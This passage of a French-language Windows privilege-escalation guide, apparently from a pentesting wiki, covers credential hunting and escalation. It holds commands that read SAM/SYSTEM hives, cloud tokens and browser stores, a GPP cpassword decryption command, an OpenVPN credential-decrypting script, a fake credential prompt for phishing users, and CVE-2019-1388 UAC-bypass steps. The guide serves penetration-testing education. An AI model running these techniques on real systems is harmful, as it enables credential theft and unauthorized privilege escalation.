<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Sauvegardes SAM et SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Les fichiers de sauvegarde Windows Imaging (`.wim`) lisibles peuvent également contenir des ruches `SAM`, `SECURITY` et `SYSTEM` hors ligne. Donnez la priorité aux répertoires de sauvegarde ou d’image accessibles localement et inspectez les **noms des membres** d’une image avant d’en extraire quoi que ce soit ; le seul nom de fichier `.wim` ne prouve pas que des ruches sont exposées, et les images courantes `install.wim`, `boot.wim` et de récupération sont souvent de fausses pistes. Un partage SMB constitue une voie d’accès distincte et ne doit être vérifié que si ce partage est dans le périmètre. Consultez les [instructions de Microsoft sur les images Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) et la [référence des fichiers de ruches du registre](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Identifiants cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Recherchez un fichier nommé **SiteList.xml**

### Mot de passe GPP mis en cache

Une fonctionnalité permettait auparavant de déployer des comptes administrateur locaux personnalisés sur un groupe de machines via Group Policy Preferences (GPP). Cependant, cette méthode présentait d’importantes failles de sécurité. Premièrement, les Group Policy Objects (GPO), stockés sous forme de fichiers XML dans SYSVOL, étaient accessibles à tous les utilisateurs du domaine. Deuxièmement, les mots de passe contenus dans ces GPP, chiffrés avec AES256 à l’aide d’une clé par défaut documentée publiquement, pouvaient être déchiffrés par tout utilisateur authentifié. Cela représentait un risque grave, car des utilisateurs pouvaient ainsi obtenir des privilèges élevés.

Pour atténuer ce risque, une fonction a été développée pour rechercher les fichiers GPP mis en cache localement contenant un champ « cpassword » non vide. Lorsqu’un tel fichier est trouvé, la fonction déchiffre le mot de passe et renvoie un objet PowerShell personnalisé. Cet objet fournit des détails sur le GPP et l’emplacement du fichier, ce qui facilite l’identification et la correction de cette vulnérabilité.

Recherchez ces fichiers dans `C:\ProgramData\Microsoft\Group Policy\history` ou dans _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (avant Windows Vista)_ :

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Pour déchiffrer le cPassword :**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Utiliser crackmapexec pour obtenir les mots de passe :

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Configuration Web IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Exemple de web.config avec des identifiants :

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Archives de sauvegarde dans un webroot IIS

Une ancienne sauvegarde ZIP placée directement dans un webroot servi peut exposer d’anciens fichiers de configuration et des identifiants réutilisables. Vérifiez le chemin physique configuré pour le site et si l’archive est réellement accessible via HTTP avant de considérer cela comme une exposition. Le chemin par défaut `C:\inetpub\wwwroot` n’est qu’une possibilité. Un inventaire local rapide permet de lister les noms et les tailles sans ouvrir les archives :

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Un nom d’archive ne permet pas d’établir qu’elle contient un secret ni qu’un identifiant récupéré confère des privilèges plus élevés.

### Identifiants OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Journaux

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Demander des identifiants

Vous pouvez toujours **demander à l’utilisateur de saisir ses identifiants, voire ceux d’un autre utilisateur**, si vous pensez qu’il peut les connaître (notez que **demander** directement au client ses **identifiants** est vraiment **risqué**) :

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Noms de fichiers possibles contenant des identifiants**

Fichiers connus qui contenaient autrefois des **mots de passe** en **texte brut** ou en Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Variante de liste de noms de fichiers sans l’extension Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Les bases de données Password Safe v3 utilisent souvent l’extension `.psafe3`. Considérez un nom de fichier correspondant comme un candidat de coffre chiffré ; sa présence ne prouve pas que vous pouvez le lire, le déverrouiller ou utiliser les identifiants qui y sont stockés. Lors de l’examen des emplacements de stockage de ces fichiers, vérifiez les profils utilisateur accessibles et les racines de partage de fichiers configurées.

Un fichier KeePass `.kdbx` lisible n’est également qu’une piste vers un coffre chiffré. Pour le déverrouiller, il faut le mot de passe maître réel ainsi que tout fichier de clé ou facteur de compte configuré. Si, lors d’un examen autorisé, une entrée contient une paire de hachages LM:NT, vérifiez le compte indiqué et déterminez si le hachage NT est à jour et accepté par le service NTLM de la cible avant d’envisager [pass-the-hash](../ntlm/README.md#pass-the-hash). Une entrée de coffre ne confère pas à elle seule les droits Administrator ou SYSTEM ; l’accès au service distant, les droits du compte et toute étape distincte d’exécution de service doivent également être disponibles. L’inventaire doit indiquer le chemin du coffre et s’il est lisible, sans afficher la base de données ni les identifiants stockés.

Recherchez tous les fichiers proposés :

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Variante de la commande de recherche sans l’extension Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Identifiants dans la Corbeille

Vous devriez également vérifier la Corbeille pour y rechercher des identifiants.

Vérifiez les éléments accessibles de la Corbeille à la recherche de sauvegardes supprimées et d’archives de configuration, ainsi que de fichiers dont le nom mentionne explicitement des identifiants. Une sauvegarde `.7z`, `.zip` ou `.rar` utile peut dater de plusieurs mois et porter un nom ordinaire. Windows stocke le chemin d’origine et la date de suppression dans un enregistrement `$I`, et le fichier supprimé dans l’entrée `$R` associée ; inspectez les métadonnées et vérifiez que l’identité actuelle dispose d’un accès en lecture avant d’ouvrir une archive. La visibilité dépend du volume, du SID utilisateur et des permissions sur les fichiers : une liste vide ne prouve donc pas qu’aucune sauvegarde récupérable n’existe. Considérez le nom d’une archive comme une piste à examiner, et non comme une preuve qu’elle contient un secret valide.

Un fichier `.pfx` supprimé et accessible peut aussi constituer une piste de **signature de code**. S’il contient une clé privée accessible, cette clé peut signer un script PowerShell modifié ; [PowerShell exige un certificat de signature de code doté d’une clé privée](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), et [les règles AppLocker de l’éditeur évaluent l’identité du signataire et la portée de la règle](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Une exécution entre comptes exige que l’identité actuelle puisse modifier le script concerné, qu’une règle effective accepte la signature obtenue pour ce script et le compte cible, et qu’une tâche planifiée ou un autre mécanisme doté de privilèges supérieurs l’exécute réellement. Le nom d’un fichier `.pfx`, le sujet d’un certificat ou le fait qu’un script soit modifiable ne suffisent pas à établir cette chaîne. Examinez les métadonnées, les ACL, la stratégie et la commande planifiée avant d’ouvrir du matériel contenant une clé privée ou de déclencher la tâche.

Examinez également les bases de données de profils accessibles des clients de messagerie, les notes et les fichiers reçus à la recherche de pistes d’identifiants. Une exportation de clé de récupération BitLocker peut être stockée au format HTML ou TXT, parfois dans une archive de sauvegarde nommée. Ce type de matériel peut donner accès à un volume de données chiffré distinct contenant d’anciennes sauvegardes ; n’examinez le volume et l’archive que si vous y êtes autorisé. Si une sauvegarde contient `NTDS.dit`, la récupération hors ligne des identifiants du domaine nécessite également la ruche `SYSTEM` correspondante, comme indiqué dans le [processus relatif aux sauvegardes et aux groupes privilégiés](../active-directory-methodology/privileged-groups-and-token-privileges.md). Les noms de fichiers et un volume verrouillé ne prouvent pas à eux seuls qu’une clé de récupération utilisable ou une sauvegarde du domaine existe.

Pour **récupérer les mots de passe** enregistrés par plusieurs programmes, vous pouvez utiliser : [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dans le registre

**Autres clés de registre susceptibles de contenir des identifiants**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extraire les clés openssh du registre.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historique des navigateurs

Vérifiez la présence de bases de données contenant les mots de passe de **Chrome ou Firefox**.\
Vérifiez la présence de bases de données contenant les mots de passe de **Chrome, Edge ou Firefox**.\
Vérifiez également l’historique, les marque-pages et les favoris des navigateurs : des **mots de passe peuvent** s’y trouver.

Pour le profil **Default** habituel de l’utilisateur actuel dans Edge, `Login Data` se trouve sous `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, tandis que `Local State` se trouve dans le répertoire parent `User Data`. [Microsoft documente l’emplacement par défaut des profils](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars) ; un autre profil ou une stratégie `UserDataDir` peut le modifier. La présence des fichiers indique seulement une piste vers un magasin d’identifiants : vérifiez que les fichiers sont lisibles, que le contexte DPAPI de l’utilisateur concerné ou d’autres éléments de clé autorisés s’appliquent, et qu’une session enregistrée appartient bien à un compte plus privilégié. L’énumération des chemins seule n’a pas besoin d’ouvrir la base de données ni d’afficher les mots de passe déchiffrés.

Pour Firefox, [Mozilla indique](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) que `key4.db` et `logins.json` sont les fichiers associés contenant respectivement la clé et les identifiants chiffrés d’un profil. Leur présence indique seulement une piste : vérifiez que les deux fichiers sont lisibles, que des entrées enregistrées existent et qu’un mot de passe principal protège la clé avant de conclure que les identifiants sont utilisables. Si un identifiant récupéré appartient à un compte de domaine, examinez séparément les droits effectifs de contrôle de groupe de ce compte et les droits du groupe en matière de [lecture ou de déchiffrement des mots de passe LAPS](../active-directory-methodology/laps.md) ; les artefacts du navigateur ne suffisent pas à établir une voie d’accès administrateur.

Outils d’extraction des mots de passe des navigateurs :

- Mimikatz : `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Le **Component Object Model (COM)** est une technologie intégrée au système d’exploitation Windows qui permet la **communication** entre des composants logiciels écrits dans différents langages. Chaque composant COM est **identifié par un ID de classe (CLSID)** et expose des fonctionnalités par une ou plusieurs interfaces, identifiées par des ID d’interface (IID).

Les classes et interfaces COM sont définies respectivement dans le registre sous **HKEY\CLASSES\ROOT\CLSID** et **HKEY\CLASSES\ROOT\Interface**. Ce registre est créé par la fusion de **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Dans les CLSID de ce registre, vous trouverez la sous-clé **InProcServer32**, qui contient une **valeur par défaut** pointant vers une **DLL**, ainsi qu’une valeur appelée **ThreadingModel**, qui peut être **Apartment** (monothread), **Free** (multithread), **Both** (mono ou multithread) ou **Neutral** (neutre vis-à-vis des threads).

![Historique des navigateurs - COM DLL Overwriting : dans les CLSID de ce registre, vous trouverez la sous-clé InProcServer32, qui contient une valeur par défaut pointant vers une DLL et une valeur...](<../../images/image (729).png>)

En gros, si vous pouvez **remplacer l’une des DLL** qui seront exécutées, vous pourriez **élever vos privilèges** si cette DLL est exécutée par un autre utilisateur.

Pour en savoir plus sur l’utilisation de COM Hijacking par les attaquants comme mécanisme de persistance, consultez :

{{#ref}}
com-hijacking.md
{{#endref}}

### **Recherche générique de mots de passe dans les fichiers et le registre**

**Rechercher dans le contenu des fichiers**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Rechercher un fichier portant un nom précis**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Rechercher dans le registre les noms de clés et les mots de passe**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Outils de recherche de mots de passe

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **est un plugin msf** que j’ai créé pour **exécuter automatiquement chaque module POST de metasploit qui recherche des identifiants** sur la victime.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) recherche automatiquement tous les fichiers contenant les mots de passe mentionnés sur cette page.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) est un autre excellent outil pour extraire les mots de passe d’un système.

L’outil [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) recherche les **sessions**, les **noms d’utilisateur** et les **mots de passe** de plusieurs outils qui enregistrent ces données en texte clair (PuTTY, WinSCP, FileZilla, SuperPuTTY et RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Imaginez qu’**un processus exécuté en tant que SYSTEM ouvre un nouveau processus** (`OpenProcess()`) avec un **accès complet**. Le même processus **crée également un nouveau processus** (`CreateProcess()`) **avec des privilèges faibles, mais en lui faisant hériter de tous les handles ouverts du processus principal**.\
Ensuite, si vous avez un **accès complet au processus aux privilèges faibles**, vous pouvez récupérer le **handle ouvert vers le processus privilégié créé** avec `OpenProcess()` et **injecter un shellcode**.\
[Consultez cet exemple pour en savoir plus sur **la détection et l’exploitation de cette vulnérabilité**.](leaked-handle-exploitation.md)\
[Consultez aussi **cet autre article, qui explique plus en détail comment tester et exploiter d’autres handles ouverts de processus et de threads hérités avec différents niveaux d’autorisation (pas seulement un accès complet)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Les segments de mémoire partagée, appelés **pipes**, permettent la communication entre les processus et le transfert de données.

Windows propose une fonctionnalité appelée **Named Pipes**, qui permet à des processus sans lien entre eux de partager des données, y compris sur différents réseaux. Ce mécanisme ressemble à une architecture client/serveur, avec des rôles définis comme **serveur de named pipe** et **client de named pipe**.

Lorsqu’un **client** envoie des données via un pipe, le **serveur** qui l’a configuré peut **usurper l’identité** du **client**, à condition de disposer des droits **SeImpersonate** nécessaires. Repérer un **processus privilégié** qui communique via un pipe que vous pouvez imiter permet de **gagner des privilèges plus élevés** en adoptant l’identité de ce processus lorsqu’il interagit avec le pipe que vous avez établi. Pour savoir comment mener cette attaque, consultez ces guides : [**ici**](named-pipe-client-impersonation.md) et [**ici**](#from-high-integrity-to-system).

L’outil suivant permet également **d’intercepter une communication par named pipe avec un outil comme Burp :** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **et cet outil permet de répertorier et d’afficher tous les pipes afin de rechercher des élévations de privilèges :** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Écriture DWORD distante dans Telephony tapsrv menant à une exécution de code à distance

Le service Telephony (TapiSrv), en mode serveur, expose `\\pipe\\tapsrv` (MS-TRP). Un client distant authentifié peut exploiter le chemin d’événements asynchrones basé sur les mailslots pour transformer `ClientAttach` en une **écriture arbitraire de 4 octets** dans n’importe quel fichier existant accessible en écriture par `NETWORK SERVICE`, puis obtenir les droits d’administrateur Telephony et charger une DLL arbitraire en tant que service. Déroulement complet :

- `ClientAttach` avec `pszDomainUser` défini sur un chemin existant accessible en écriture → le service l’ouvre via `CreateFileW(..., OPEN_EXISTING)` et l’utilise pour les écritures d’événements asynchrones.
- Chaque événement écrit dans ce handle le `InitContext` contrôlé par l’attaquant et défini par `Initialize`. Enregistrez une application de ligne avec `LRegisterRequestRecipient` (`Req_Func 61`), déclenchez `TRequestMakeCall` (`Req_Func 121`), récupérez les événements avec `GetAsyncEvents` (`Req_Func 0`), puis désenregistrez et arrêtez le service pour répéter les écritures de façon déterministe.
- Ajoutez-vous à `[TapiAdministrators]` dans `C:\Windows\TAPI\tsec.ini`, reconnectez-vous, puis appelez `GetUIDllName` avec le chemin d’une DLL arbitraire afin d’exécuter `TSPI_providerUIIdentify` en tant que `NETWORK SERVICE`.

Plus de détails :

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Divers

### Extensions de fichiers susceptibles d’exécuter du code sous Windows

Consultez la page **[https://filesec.io/](https://filesec.io/)**

### Abus des gestionnaires de protocole / de ShellExecute via les rendus Markdown

Les liens Markdown cliquables transmis à `ShellExecuteExW` peuvent déclencher des gestionnaires d’URI dangereux (`file:`, `ms-appinstaller:` ou tout schéma enregistré) et exécuter des fichiers contrôlés par un attaquant en tant qu’utilisateur courant. Voir :

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Surveillance des lignes de commande pour repérer les mots de passe**

Lorsque vous obtenez un shell en tant qu’utilisateur, des tâches planifiées ou d’autres processus peuvent être en cours d’exécution et **transmettre des identifiants sur la ligne de commande**. Le script ci-dessous capture les lignes de commande des processus toutes les deux secondes et les compare à l’état précédent, en affichant les différences.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Vol de mots de passe dans les processus

## De Low Priv User à NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Si vous avez accès à l’interface graphique (via la console ou RDP) et que l’UAC est activé, il est possible, dans certaines versions de Microsoft Windows, d’exécuter un terminal ou tout autre processus en tant que « NT\AUTHORITY SYSTEM » à partir d’un utilisateur non privilégié.

Cela permet d’élever ses privilèges et de contourner l’UAC simultanément, à l’aide de la même vulnérabilité. De plus, rien n’a besoin d’être installé et le binaire utilisé pendant le processus est signé et émis par Microsoft.

Voici quelques-uns des systèmes concernés :

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Pour exploiter cette vulnérabilité, il est nécessaire d'effectuer les étapes suivantes :

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Vous trouverez tous les fichiers et renseignements nécessaires dans le dépôt GitHub suivant :

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Du niveau d’intégrité moyen au niveau élevé / contournement de l’UAC

Lisez ceci pour **en savoir plus sur les niveaux d’intégrité** :

{{#ref}}
integrity-levels.md
{{#endref}}

Puis **lisez ceci pour en savoir plus sur l’UAC et ses contournements** :

{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Jonctions de répertoires de téléversement vers une racine publiée

Une application peut créer un sous-répertoire de téléversement prévisible, y écrire un nom de fichier fourni par l’appelant, puis traiter le fichier. Si un utilisateur à faibles privilèges peut supprimer ce sous-répertoire et le remplacer par une jonction NTFS avant l’écriture côté serveur, celle-ci peut suivre la jonction jusqu’à un répertoire publié sur le Web. Un script placé à cet endroit peut s’exécuter sous l’identité du service Web si le serveur exécute ce type de fichier. Il s’agit d’une possibilité d’écriture arbitraire propre à l’application ; un répertoire de téléversement accessible en écriture ou une jonction existante ne suffisent pas, à eux seuls, à le démontrer.

Vérifiez la construction exacte du chemin et le moment où elle intervient dans le gestionnaire de téléversement, les droits effectifs de l’utilisateur pour supprimer et créer le sous-répertoire, les ACL effectives de la destination, si le processus d’écriture suit les points d’analyse et si le serveur Web exécute des fichiers dans cette destination. Vérifiez séparément les identités des processus d’écriture et du serveur Web. Un inventaire passif peut révéler les ACL des répertoires et les métadonnées des points d’analyse, mais il ne permet pas d’établir le comportement du gestionnaire ni de confirmer qu’un remplacement par une jonction aura lieu. Si l’exécution se fait sous un compte de service, examinez le **jeton du processus réel** avant d’envisager une éventuelle exploitation distincte des privilèges du jeton.

## Nettoyage de tâches planifiées privilégiées déclenché par WNF

Une tâche planifiée qui refuse l’exécution manuelle peut tout de même exposer un déclencheur accessible à un utilisateur non privilégié. Lors de l’audit d’une tâche privilégiée, exportez son XML et examinez **tous** ses déclencheurs, ainsi que la DACL de la tâche, le principal et l’action. En particulier, un `WnfStateChangeTrigger` désigne un état de Windows Notification Facility (WNF) ; si cet état sécurisable autorise l’utilisateur actuel à publier une mise à jour, celui-ci peut démarrer indirectement la tâche sous l’identité qui lui est configurée, malgré `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Par exemple, la tâche Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` s’exécutait en tant que SYSTEM, acceptait les mises à jour de l’état WNF `7508BCA32C079E41` provenant d’un utilisateur standard, puis examinait `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, même lorsque Recall était désactivé.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

